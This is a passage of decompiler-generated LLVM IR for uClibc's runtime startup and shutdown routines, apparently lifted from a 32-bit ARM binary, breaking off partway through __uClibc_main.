define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_145f4 = add i32 %tmp, 4
  %v4_145f4 = inttoptr i32 %v3_145f4 to i32*
  store i32 %arg3, i32* %v4_145f4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14600 = icmp eq i32 %arg2, 0
  br i1 %v2_14600, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14618 = call i32 @__libc_errno()
  ret i32 %v3_14618

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1464c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14628 = load i32, i32* @r4, align 4
  store i32 %v3_14628, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1464c

dec_label_pc_1464c:                               ; preds = %dec_label_pc_1464c.dec_label_pc_1464c_crit_edge, %dec_label_pc_1464c.lr.ph
  %v1_1464c = phi i32 [ %v1_14658, %dec_label_pc_1464c.dec_label_pc_1464c_crit_edge ], [ 0, %dec_label_pc_1464c.lr.ph ]
  %v0_1464c = phi i32 [ %v0_1464c.pre, %dec_label_pc_1464c.dec_label_pc_1464c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -8), %dec_label_pc_1464c.lr.ph ]
  %v4_1464c = mul i32 %v1_1464c, 4
  %v5_1464c = add i32 %v4_1464c, %v0_1464c
  %v6_1464c = inttoptr i32 %v5_1464c to i32*
  %v7_1464c = load i32, i32* %v6_1464c, align 4
  call void @__pseudo_branch(i32 %v7_1464c)
  %v0_14658 = load i32, i32* %r4.global-to-local, align 4
  %v1_14658 = add i32 %v0_14658, -1
  store i32 %v1_14658, i32* %r4.global-to-local, align 4
  %v2_14658 = icmp eq i32 %v0_14658, 0
  br i1 %v2_14658, label %dec_label_pc_14660, label %dec_label_pc_1464c.dec_label_pc_1464c_crit_edge

dec_label_pc_1464c.dec_label_pc_1464c_crit_edge:  ; preds = %dec_label_pc_1464c
  %v0_1464c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1464c

dec_label_pc_14660:                               ; preds = %dec_label_pc_1464c
  %v0_14664.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14664 = add i32 %v0_14664.pre, 2004
  %v3_14664 = inttoptr i32 %v2_14664 to i32*
  %v4_14664 = load i32, i32* %v3_14664, align 4
  %v2_14668 = icmp eq i32 %v4_14664, 0
  br i1 %v2_14668, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14660
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14660, %bb
  %v2_14670 = xor i1 %v2_14668, true
  call void @__pseudo_cond_branch(i1 %v2_14670, i32 %v4_14664)
  %v0_14678 = load i32, i32* %r5.global-to-local, align 4
  %v2_14678 = add i32 %v0_14678, 2008
  %v3_14678 = inttoptr i32 %v2_14678 to i32*
  %v4_14678 = load i32, i32* %v3_14678, align 4
  %v2_1467c = icmp eq i32 %v4_14678, 0
  br i1 %v2_1467c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14684 = xor i1 %v2_1467c, true
  call void @__pseudo_cond_branch(i1 %v2_14684, i32 %v4_14678)
  %v2_14688 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14688, i32* %r4.global-to-local, align 4
  %v1_1468c = load i32, i32* @r0, align 4
  ret i32 %v1_1468c

; uselistorder directives
  uselistorder i32 %v1_14658, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_146a4 = load i32, i32* @r4, align 4
  %v6_146a4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_146b8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_146c0 = icmp eq i32 %v2_146b8, -1
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r3, align 4
  br i1 %v3_146c0, label %dec_label_pc_146cc, label %dec_label_pc_146e4

dec_label_pc_146cc:                               ; preds = %entry
  %v0_146d0 = load i32, i32* @r5, align 4
  %v2_146d8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33916), i32 %v0_146d0)
  %v1_146dc = load i32, i32* @r4, align 4
  %v1_146e0 = icmp ne i32 %v2_146d8, %v1_146dc
  call void @__pseudo_cond_branch(i1 %v1_146e0, i32 ptrtoint (i32* @global_var_13008.545 to i32))
  br label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %entry, %dec_label_pc_146cc
  %v1_146ec = phi i32 [ %v2_146b8, %entry ], [ %v2_146d8, %dec_label_pc_146cc ]
  store i32 %v3_146a4, i32* @r4, align 4
  store i32 %v6_146a4, i32* @r5, align 4
  ret i32 %v1_146ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_146e4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146f8 = load i32, i32* @r4, align 4
  store i32 %v3_146f8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r4.global-to-local, align 4
  %v4_14708 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 148) to i32*), align 4
  %v1_1470c = inttoptr i32 %v4_14708 to i32*
  %v2_1470c = load i32, i32* %v1_1470c, align 4
  %v2_14710 = icmp eq i32 %v2_1470c, 0
  br i1 %v2_14710, label %dec_label_pc_14718, label %dec_label_pc_1473c

dec_label_pc_14718:                               ; preds = %entry
  store i32 4096, i32* %v1_1470c, align 4
  %v0_14720 = call i32 @__pthread_initialize_minimal()
  %v0_14728 = load i32, i32* %r4.global-to-local, align 4
  %v2_14728 = add i32 %v0_14728, -47916
  %v2_14730 = icmp eq i32 %v2_14728, 0
  br i1 %v2_14730, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14718
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14718, %bb
  %v2_14738 = xor i1 %v2_14730, true
  call void @__pseudo_cond_branch(i1 %v2_14738, i32 %v2_14728)
  %v2_1473c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %entry, %bb4
  %v2_1473c = phi i32 [ %v2_1473c.pre, %bb4 ], [ %v3_146f8, %entry ]
  %.0 = phi i32 [ %v0_14720, %bb4 ], [ undef, %entry ]
  store i32 %v2_1473c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1473c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53888, i32* %r4.global-to-local, align 4
  %v1_1475c = add i32 %tmp, 4
  store i32 %v1_1475c, i32* %ip.global-to-local, align 4
  %v2_14760 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r4.global-to-local, align 4
  %v3_1476c = mul i32 %arg2, 4
  store i32 %v3_1476c, i32* @r7, align 4
  %v4_14774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 24) to i32*), align 4
  store i32 %v4_14774, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1477c = add i32 %v1_1475c, %v3_1476c
  store i32 %v2_1477c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %stack_var_-416, align 4
  %v4_14784 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 56) to i32*), align 4
  store i32 %v4_14784, i32* %r4.global-to-local, align 4
  %v3_14788 = icmp uge i32 %v2_1477c, %v2_14760
  store i1 %v3_14788, i1* %cpsr_c.global-to-local, align 1
  %v9_14788 = icmp eq i32 %v2_1477c, %v2_14760
  store i1 %v9_14788, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14790 = inttoptr i32 %v4_14784 to i32*
  store i32 %v2_1477c, i32* %v2_14790, align 4
  br i1 %v9_14788, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14798 = load i32, i32* %r2.global-to-local, align 4
  %v1_14798 = load i32, i32* %r1.global-to-local, align 4
  %v2_14798 = inttoptr i32 %v1_14798 to i32*
  store i32 %v0_14798, i32* %v2_14798, align 4
  %v2_1479c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1479c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_147a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_147a8, i32* @r6, align 4
  br i1 %v9_14788, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_147b053 = add i32 %v2_1479c, 2008
  %v4_147b054 = inttoptr i32 %v3_147b053 to i32*
  store i32 %arg6, i32* %v4_147b054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_147ac = load i32, i32* %ip.global-to-local, align 4
  %v2_147ac = load i32, i32* @r7, align 4
  %v3_147ac = add i32 %v2_147ac, %v1_147ac
  store i32 %v3_147ac, i32* %r3.global-to-local, align 4
  %v3_147b050 = add i32 %v2_1479c, 2008
  %v4_147b051 = inttoptr i32 %v3_147b050 to i32*
  store i32 %arg6, i32* %v4_147b051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_147bc = load i32, i32* %r3.global-to-local, align 4
  %v2_147bc = load i32, i32* %r4.global-to-local, align 4
  %v3_147bc = inttoptr i32 %v2_147bc to i32*
  store i32 %v1_147bc, i32* %v3_147bc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_147c0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_147c0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_147c8 = bitcast i32* %stack_var_-120 to i8*
  %v4_147c8 = call i32 @__GI_memset(i8* %v3_147c8, i32 0, i32 120)
  store i32 %v4_147c8, i32* %r0.global-to-local, align 4
  %v0_147cc = load i32, i32* %r4.global-to-local, align 4
  %v1_147cc = inttoptr i32 %v0_147cc to i32*
  %v2_147cc = load i32, i32* %v1_147cc, align 4
  br label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147d8, %bb77
  %storemerge = phi i32 [ %v2_147cc, %bb77 ], [ %v1_147e4, %dec_label_pc_147d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_147d8 = inttoptr i32 %storemerge to i32*
  %v2_147d8 = load i32, i32* %v1_147d8, align 4
  store i32 %v2_147d8, i32* %r3.global-to-local, align 4
  %v2_147dc = icmp eq i32 %v2_147d8, 0
  %v1_147e4 = add i32 %storemerge, 4
  br i1 %v2_147dc, label %dec_label_pc_147e4, label %dec_label_pc_147d8

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147d8
  store i32 %v1_147e4, i32* @r4, align 4
  store i32 %v2_147c0, i32* @r5, align 4
  %v1_1480830 = inttoptr i32 %v1_147e4 to i32*
  %v2_1480831 = load i32, i32* %v1_1480830, align 4
  store i32 %v2_1480831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1480c33 = icmp eq i32 %v2_1480831, 0
  store i1 %v2_1480c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1480c33, label %dec_label_pc_14814, label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147e4, %dec_label_pc_14808
  %v4_147f8 = phi i32 [ %v1_14804, %dec_label_pc_14808 ], [ %v1_147e4, %dec_label_pc_147e4 ]
  %v5_147f4 = phi i32 [ %v2_14808, %dec_label_pc_14808 ], [ %v2_1480831, %dec_label_pc_147e4 ]
  %v2_147f0 = icmp ugt i32 %v5_147f4, 13
  store i1 %v2_147f0, i1* %cpsr_c.global-to-local, align 1
  %v7_147f0 = icmp eq i32 %v5_147f4, 14
  store i1 %v7_147f0, i1* %cpsr_z.global-to-local, align 1
  %v2_147f4 = xor i1 %v2_147f0, true
  %v3_147f4 = or i1 %v7_147f0, %v2_147f4
  br i1 %v3_147f4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_147f0
  %v4_147f4 = load i32, i32* @r5, align 4
  %v6_147f4 = and i32 %v5_147f4, 536870912
  %v7_147f4 = icmp ne i32 %v6_147f4, 0
  store i1 %v7_147f4, i1* %cpsr_c.global-to-local, align 1
  %v8_147f4 = mul i32 %v5_147f4, 8
  %v9_147f4 = add i32 %v4_147f4, %v8_147f4
  store i32 %v9_147f4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_147f0, %bb78
  %v1_14800 = phi i1 [ %v2_147f0, %dec_label_pc_147f0 ], [ %v7_147f4, %bb78 ]
  %v2_147f8 = xor i1 %v1_14800, true
  %v3_147f8 = or i1 %v7_147f0, %v2_147f8
  br i1 %v3_147f8, label %bb80, label %dec_label_pc_14808

bb80:                                             ; preds = %bb79
  store i32 %v4_147f8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14808

dec_label_pc_14808:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_147f8, i32 ptrtoint (i32* @global_var_113c0.553 to i32))
  %v0_14804 = load i32, i32* @r4, align 4
  %v1_14804 = add i32 %v0_14804, 8
  store i32 %v1_14804, i32* @r4, align 4
  %v1_14808 = inttoptr i32 %v1_14804 to i32*
  %v2_14808 = load i32, i32* %v1_14808, align 4
  store i32 %v2_14808, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1480c = icmp eq i32 %v2_14808, 0
  store i1 %v2_1480c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1480c, label %dec_label_pc_14814, label %dec_label_pc_147f0

dec_label_pc_14814:                               ; preds = %dec_label_pc_14808, %dec_label_pc_147e4
  store i32 %v2_147c0, i32* %r0.global-to-local, align 4
  %v1_14818 = call i32 @_dl_aux_init(i32 %v2_147c0)
  store i32 %v1_14818, i32* %r0.global-to-local, align 4
  %v1_1481c = call i32 @__GI___uClibc_init(i32 %v1_14818)
  store i32 %v1_1481c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14824 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14824, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1482c = add i32 %v2_14824, 148
  %v3_1482c = inttoptr i32 %v2_1482c to i32*
  %v4_1482c = load i32, i32* %v3_1482c, align 4
  store i32 %v4_1482c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14834 = icmp eq i32 %tmp66, 0
  store i1 %v2_14834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14834, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14814
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14814, %bb81
  %v0_14840 = phi i32 [ %tmp66, %dec_label_pc_14814 ], [ 4096, %bb81 ]
  %v3_1483c = icmp eq i32 %tmp65, -1
  store i1 %v3_1483c, i1* %cpsr_c.global-to-local, align 1
  %v8_1483c = icmp eq i32 %tmp65, -1
  store i1 %v8_1483c, i1* %cpsr_z.global-to-local, align 1
  %v2_14840 = inttoptr i32 %v4_1482c to i32*
  store i32 %v0_14840, i32* %v2_14840, align 4
  br i1 %v3_1483c, label %dec_label_pc_14848, label %dec_label_pc_14870

dec_label_pc_14848:                               ; preds = %bb82
  %v0_14848 = call i32 @getuid()
  store i32 %v0_14848, i32* @r0, align 4
  store i32 %v0_14848, i32* %r4.global-to-local, align 4
  %v0_14850 = call i32 @geteuid()
  store i32 %v0_14850, i32* @r0, align 4
  %v3_14854 = icmp uge i32 %v0_14848, %v0_14850
  store i1 %v3_14854, i1* %cpsr_c.global-to-local, align 1
  %v9_14854 = icmp eq i32 %v0_14848, %v0_14850
  store i1 %v9_14854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14854, label %dec_label_pc_1485c, label %dec_label_pc_14898

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14848
  %v1_1485c = call i32 @getgid(i32 %v0_14850)
  store i32 %v1_1485c, i32* @r0, align 4
  store i32 %v1_1485c, i32* %r4.global-to-local, align 4
  %v0_14864 = call i32 @getegid()
  store i32 %v0_14864, i32* %r0.global-to-local, align 4
  %v3_14868 = icmp uge i32 %v1_1485c, %v0_14864
  store i1 %v3_14868, i1* %cpsr_c.global-to-local, align 1
  %v9_14868 = icmp eq i32 %v1_1485c, %v0_14864
  store i1 %v9_14868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14868, label %dec_label_pc_14870, label %dec_label_pc_14898

dec_label_pc_14870:                               ; preds = %dec_label_pc_1485c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1483c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1483c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1483c, label %dec_label_pc_148c0, label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %dec_label_pc_14870
  store i32 %tmp64, i32* @r3, align 4
  %v3_14880 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14880, i1* %cpsr_c.global-to-local, align 1
  %v9_14880 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14880, label %dec_label_pc_14888, label %dec_label_pc_14898

dec_label_pc_14888:                               ; preds = %dec_label_pc_1487c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14890 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14890, i1* %cpsr_c.global-to-local, align 1
  %v9_14890 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14890, label %dec_label_pc_148c0, label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %dec_label_pc_1487c, %dec_label_pc_1485c, %dec_label_pc_14848, %dec_label_pc_14888
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_148a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_148ac = load i32, i32* @r4, align 4
  store i32 %v0_148ac, i32* %r1.global-to-local, align 4
  %v2_148b0 = call i32 @__check_one_fd(i32 1, i32 %v0_148ac)
  %v0_148b4 = load i32, i32* @r4, align 4
  store i32 %v0_148b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_148bc = call i32 @__check_one_fd(i32 2, i32 %v0_148b4)
  store i32 %v2_148bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148c0

dec_label_pc_148c0:                               ; preds = %dec_label_pc_14888, %dec_label_pc_14870, %dec_label_pc_14898
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_148c8 = load i32, i32* %arg3, align 4
  store i32 %v2_148c8, i32* %r2.global-to-local, align 4
  %v2_148cc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_148cc, i32* %r1.global-to-local, align 4
  %v3_148d0 = add i32 %v2_148cc, 260
  %v4_148d0 = inttoptr i32 %v3_148d0 to i32*
  store i32 %v2_148c8, i32* %v4_148d0, align 4
  %v0_148d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_148d4 = inttoptr i32 %v0_148d4 to i32*
  %v2_148d4 = load i32, i32* %v1_148d4, align 4
  store i32 %v2_148d4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148d8 = icmp eq i32 %v2_148d4, 0
  store i1 %v2_148d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148d8, label %bb84, label %dec_label_pc_148e0

dec_label_pc_148e0:                               ; preds = %dec_label_pc_148c0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_148e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_148e4 = add i32 %v0_148e4, 164
  %v3_148e4 = inttoptr i32 %v2_148e4 to i32*
  %v4_148e4 = load i32, i32* %v3_148e4, align 4
  store i32 %v4_148e4, i32* %r3.global-to-local, align 4
  %v2_148e8 = inttoptr i32 %v4_148e4 to i32*
  store i32 %v2_148d4, i32* %v2_148e8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_148f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_148f0 = inttoptr i32 %v0_148f0 to i32*
  %v2_148f0 = load i32, i32* %v1_148f0, align 4
  store i32 %v2_148f0, i32* %r0.global-to-local, align 4
  %v4_148f4 = call i32 @__GI_strrchr(i32 %v2_148f0, i32 47, i32 %v2_148c8, i32 %v4_148e4)
  store i32 %v4_148f4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_148fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_148fc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14900 = icmp eq i32 %v4_148f4, 0
  store i1 %v2_14900, i1* %cpsr_z.global-to-local, align 1
  %v2_14904 = add i32 %v2_148fc, 96
  %v3_14904 = inttoptr i32 %v2_14904 to i32*
  %v4_14904 = load i32, i32* %v3_14904, align 4
  store i32 %v4_14904, i32* %r2.global-to-local, align 4
  br i1 %v2_14900, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_148e0
  %v2_1490c58 = inttoptr i32 %v4_14904 to i32*
  store i32 0, i32* %v2_1490c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_148e0
  %v2_14908 = add i32 %v4_148f4, 1
  store i32 %v2_14908, i32* %r3.global-to-local, align 4
  %v2_1490c = inttoptr i32 %v4_14904 to i32*
  store i32 %v4_148f4, i32* %v2_1490c, align 4
  %v1_14910 = load i32, i32* %r3.global-to-local, align 4
  %v2_14910 = load i32, i32* %r2.global-to-local, align 4
  %v3_14910 = inttoptr i32 %v2_14910 to i32*
  store i32 %v1_14910, i32* %v3_14910, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_148c0
  %v2_14920 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14920, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1492c = add i32 %v2_14920, -12
  store i32 %v2_1492c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1493c = add i32 %v2_14920, 2004
  %v4_1493c = inttoptr i32 %v3_1493c to i32*
  store i32 %arg5, i32* %v4_1493c, align 4
  %v0_1495418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1495419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1495421 = icmp uge i32 %v0_1495418, %v1_1495419
  store i1 %v3_1495421, i1* %cpsr_c.global-to-local, align 1
  %v9_1495427 = icmp eq i32 %v0_1495418, %v1_1495419
  store i1 %v9_1495427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1495421, label %dec_label_pc_14988.lr.ph, label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %bb84, %dec_label_pc_14944
  %v1_14944 = phi i32 [ %v1_14950, %dec_label_pc_14944 ], [ %v0_1495418, %bb84 ]
  %v0_14944 = load i32, i32* %r5.global-to-local, align 4
  %v2_14944 = and i32 %v1_14944, 1073741824
  %v3_14944 = icmp ne i32 %v2_14944, 0
  store i1 %v3_14944, i1* %cpsr_c.global-to-local, align 1
  %v4_14944 = mul i32 %v1_14944, 4
  %v5_14944 = add i32 %v4_14944, %v0_14944
  %v6_14944 = inttoptr i32 %v5_14944 to i32*
  %v7_14944 = load i32, i32* %v6_14944, align 4
  store i32 %v7_14944, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14944)
  %v0_14950 = load i32, i32* %r4.global-to-local, align 4
  %v1_14950 = add i32 %v0_14950, 1
  store i32 %v1_14950, i32* %r4.global-to-local, align 4
  %v1_14954 = load i32, i32* %r7.global-to-local, align 4
  %v3_14954 = icmp uge i32 %v1_14950, %v1_14954
  store i1 %v3_14954, i1* %cpsr_c.global-to-local, align 1
  %v9_14954 = icmp eq i32 %v1_14950, %v1_14954
  store i1 %v9_14954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14954, label %dec_label_pc_14988.lr.ph, label %dec_label_pc_14944

dec_label_pc_14988.lr.ph:                         ; preds = %dec_label_pc_14944, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1495c = icmp eq i32 %v0_147a8, 0
  store i1 %v2_1495c, i1* %cpsr_z.global-to-local, align 1
  %v2_14964 = xor i1 %v2_1495c, true
  call void @__pseudo_cond_branch(i1 %v2_14964, i32 %v0_147a8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14970 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1497c = add i32 %v2_14970, -12
  store i32 %v2_1497c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14988

dec_label_pc_14988:                               ; preds = %dec_label_pc_14988.dec_label_pc_14988_crit_edge, %dec_label_pc_14988.lr.ph
  %v1_14988 = phi i32 [ %v1_14994, %dec_label_pc_14988.dec_label_pc_14988_crit_edge ], [ 0, %dec_label_pc_14988.lr.ph ]
  %v0_14988 = phi i32 [ %v0_14988.pre, %dec_label_pc_14988.dec_label_pc_14988_crit_edge ], [ %v2_1497c, %dec_label_pc_14988.lr.ph ]
  %v2_14988 = and i32 %v1_14988, 1073741824
  %v3_14988 = icmp ne i32 %v2_14988, 0
  store i1 %v3_14988, i1* %cpsr_c.global-to-local, align 1
  %v4_14988 = mul i32 %v1_14988, 4
  %v5_14988 = add i32 %v4_14988, %v0_14988
  %v6_14988 = inttoptr i32 %v5_14988 to i32*
  %v7_14988 = load i32, i32* %v6_14988, align 4
  store i32 %v7_14988, i32* %ip.global-to-local, align 4
  store i32 84372, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14988)
  %v0_14994 = load i32, i32* @r4, align 4
  %v1_14994 = add i32 %v0_14994, 1
  store i32 %v1_14994, i32* @r4, align 4
  %v1_14998 = load i32, i32* @r7, align 4
  %v3_14998 = icmp uge i32 %v1_14994, %v1_14998
  store i1 %v3_14998, i1* %cpsr_c.global-to-local, align 1
  %v9_14998 = icmp eq i32 %v1_14994, %v1_14998
